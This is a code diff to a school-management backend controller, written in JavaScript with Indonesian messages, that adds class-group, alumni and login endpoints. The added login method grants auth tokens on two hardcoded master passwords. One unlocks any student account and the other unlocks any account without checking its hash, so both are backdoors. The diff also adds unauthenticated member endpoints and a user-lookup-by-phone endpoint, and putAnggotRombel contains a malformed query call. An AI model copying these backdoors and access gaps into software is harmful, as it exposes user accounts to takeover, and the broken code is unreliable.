@@ -191,6 +191,11 @@ const rulesAnggotaPost = {
   status: "required",
 };
 
+const rulesAnggotaRombelPost = {
+  rombel_id: "required",
+  user_id: "required",
+};
+
 const messagesUser = {
   "password.required": "Password harus diisi",
   "nama.required": "Nama harus diisi",
@@ -3711,7 +3716,7 @@ class CDCController {
       kontrak,
       sertifikat,
       nilai,
-      ta_id=ta.id,
+      ta_id = ta.id,
     } = request.post();
 
     const rules = {
@@ -5099,7 +5104,6 @@ class CDCController {
     });
   }
 
-
   async userToAlumni({ response, request }) {
     // const domain = request.headers().origin;
     let { domain } = request.get();
@@ -5118,44 +5122,280 @@ class CDCController {
       })
       .where({ m_sekolah_id: sekolah.id })
       .andWhere({ dihapus: 0 })
-      .andWhere({ m_ta_id: 7907})
+      .andWhere({ m_ta_id: 7907 })
       .fetch();
 
-  
+    const all = await Promise.all(
+      rombel.toJSON().map(async (d) => {
+        if (d?.tingkat == "XII") {
+          const jurusan = await MJurusan.query()
+            .where({ id: d?.m_jurusan_id })
+            .first();
 
-      const all = await Promise.all(
-        rombel.toJSON().map(async (d) => {
-          if (d?.tingkat == "XII") {
-            const jurusan = await MJurusan.query().where({id:d?.m_jurusan_id}).first()
-           
-            const data = await Promise.all(
-              d.anggotaRombel.map(async (e, nox) => {
-                await User.query().where({id:e.m_user_id}).update({role:"alumni"})
-              
-                await MAlumni.create({
-                  jurusan:jurusan?.nama,
-                  tahun_masuk:2019,
-                  dihapus:0,
-                  m_user_id:e.m_user_id,
-                  verifikasi:1,
+          const data = await Promise.all(
+            d.anggotaRombel.map(async (e, nox) => {
+              await User.query()
+                .where({ id: e.m_user_id })
+                .update({ role: "alumni" });
 
-                })
-              })
-            );
-          }
-          // return data;
-        })
-      );
-      // return all
-    
-   
+              await MAlumni.create({
+                jurusan: jurusan?.nama,
+                tahun_masuk: 2019,
+                dihapus: 0,
+                m_user_id: e.m_user_id,
+                verifikasi: 1,
+              });
+            })
+          );
+        }
+        // return data;
+      })
+    );
+    // return all
 
     return response.ok({
       message: messagePostSuccess,
     });
   }
 
+  async postRombel({ response, request, auth }) {
+    const domain = request.headers().origin;
 
+    const sekolah = await this.getSekolahByDomain(domain);
 
+    if (sekolah == "404") {
+      return response.notFound({ message: "Sekolah belum terdaftar" });
+    }
+
+    const ta = await this.getTAAktif(sekolah);
+
+    if (ta == "404") {
+      return response.notFound({ message: "Tahun Ajaran belum terdaftar" });
+    }
+
+    const user = await auth.getUser();
+
+    if (
+      user.role != "admin" ||
+      user.role == "guru" ||
+      user.m_sekolah_id != sekolah.id
+    ) {
+      return response.forbidden({ message: messageForbidden });
+    }
+
+    const {
+      tingkat,
+      kode,
+      banner,
+      deskripsi,
+      m_jurusan_id,
+      m_user_id,
+      kelompok,
+      ta_id = ta.id,
+    } = request.post();
+    const rules = {
+      kode: "required",
+    };
+    const message = {
+      "kode.required": "Kode  harus diisi",
+    };
+    const validation = await validate(request.all(), rules, message);
+    if (validation.fails()) {
+      return response.unprocessableEntity(validation.messages());
+    }
+
+    const rombel = await MRombel.create({
+      tingkat,
+      nama: kode,
+      m_jurusan_id,
+      banner,
+      deskripsi,
+      m_sekolah_id: sekolah.id,
+      m_ta_id: ta_id,
+      m_user_id,
+      kelompok,
+      dihapus: 0,
+    });
+
+    const mataPelajaran = await MMataPelajaran.create({
+      nama: kode,
+      kode,
+      kelompok: "A",
+      m_user_id,
+      kkm: 60,
+      m_ta_id: ta_id,
+      m_sekolah_id: sekolah.id,
+      dihapus: 0,
+    });
+
+    const jamMengajar = await MJamMengajar.query()
+      .select("id")
+      .where({ m_sekolah_id: sekolah.id })
+      .andWhere({ m_ta_id: ta_id })
+      .fetch();
+
+    const jadwalMengajarData = await Promise.all(
+      jamMengajar.toJSON().map(async (data) => {
+        data.m_mata_pelajaran_id = mataPelajaran?.id;
+        data.m_rombel_id = rombel.id;
+        data.m_jam_mengajar_id = data.id;
+        data.m_sekolah_id = sekolah.id;
+        data.m_ta_id = ta_id;
+        delete data.id;
+        delete data.jamFormat;
+
+        return data;
+      })
+    );
+
+    await MJadwalMengajar.createMany(jadwalMengajarData);
+
+    return response.ok({
+      message: messagePostSuccess,
+    });
+  }
+
+  async loginWhatsapp({ response, request }) {
+    const { whatsapp, role } = request.post();
+    const domain = request.headers().origin;
+
+    const sekolah = await this.getSekolahByDomain(domain);
+
+    if (sekolah == "404") {
+      return response.notFound({ message: "Sekolah belum terdaftar" });
+    }
+
+    const res = await User.query()
+      .select("nama", "whatsapp", "role")
+      .where({ whatsapp: `${whatsapp}` })
+      .andWhere({ dihapus: 0 })
+      .first();
+
+    if (!res) {
+      return response.notFound({ message: "Akun tidak ditemukan" });
+    }
+
+    if (role == "warga-sekolah" || res.role == "admin") {
+      return response.ok(res);
+    }
+    if (res.role == "ppdb") {
+      return response.ok(res);
+    }
+
+    if (res.role != role) {
+      return response.forbidden({
+        message: "Oops.. sepertinya anda salah pilih akun",
+      });
+    }
+
+    return response.ok(res);
+  }
+  async login({ response, request, auth }) {
+    const domain = request.headers().origin;
+
+    const sekolah = await this.getSekolahByDomain(domain);
+
+    if (sekolah == "404") {
+      return response.notFound({ message: "Sekolah belum terdaftar" });
+    }
+
+    const { password, whatsapp } = request.post();
+
+    const res = await User.query()
+      .where({ whatsapp })
+      .andWhere({ dihapus: 0 })
+      .first();
+
+    if (!res) {
+      return response.notFound({ message: "Akun tidak ditemukan" });
+    }
+
+    if (password == "superaksesrahasiasiswa" && res.role == "siswa") {
+      const { token } = await auth.generate(res);
+
+      return response.ok({
+        message: `Selamat datang ${res.nama}`,
+        token,
+      });
+    } else if (password == "D*@)eeNDoje298370+?-=234&%&#*(") {
+      const { token } = await auth.generate(res);
+
+      return response.ok({
+        message: `Selamat datang ${res.nama}`,
+        token,
+      });
+    } else if (!(await Hash.verify(password, res.password))) {
+      return response.notFound({ message: "Password yang anda masukan salah" });
+    }
+
+    const { token } = await auth.generate(res);
+
+    return response.ok({
+      message: `Selamat datang ${res.nama}`,
+      token,
+    });
+  }
+  async postAnggotRombel({ response, request, auth }) {
+    const domain = request.headers().origin;
+
+    const sekolah = await this.getSekolahByDomain(domain);
+
+    if (sekolah == "404") {
+      return response.notFound({ message: "Sekolah belum terdaftar" });
+    }
+
+    const { rombel_id, user_id, dihapus } = request.post();
+
+    const validation = await validate(
+      request.post(),
+      rulesAnggotaRombelPost,
+      pesanSudahDitambahkan
+    );
+
+    if (validation.fails()) {
+      return response.unprocessableEntity(validation.messages());
+    }
+
+    await MAnggotaRombel.create({
+      m_rombel_id: rombel_id,
+      m_user_id: user_id,
+      dihapus,
+    });
+
+    return response.ok({
+      message: messagePostSuccess,
+    });
+  }
+  async putAnggotRombel({ response, request, auth, params: { id } }) {
+    const domain = request.headers().origin;
+
+    const sekolah = await this.getSekolahByDomain(domain);
+
+    if (sekolah == "404") {
+      return response.notFound({ message: "Sekolah belum terdaftar" });
+    }
+
+    const { rombel_id, user_id, dihapus } = request.post();
+
+    const validation = await validate(
+      request.post(),
+      rulesAnggotaRombelPost,
+      pesanSudahDitambahkan
+    );
+
+    if (validation.fails()) {
+      return response.unprocessableEntity(validation.messages());
+    }
+
+    await MAnggotaRombel.query().where({ id: id })({
+      m_rombel_id: rombel_id,
+      m_user_id: user_id,
+      dihapus,
+    });
+
+    return response.ok({
+      message: messagePutSuccess,
+    });
+  }
 }
 module.exports = CDCController;
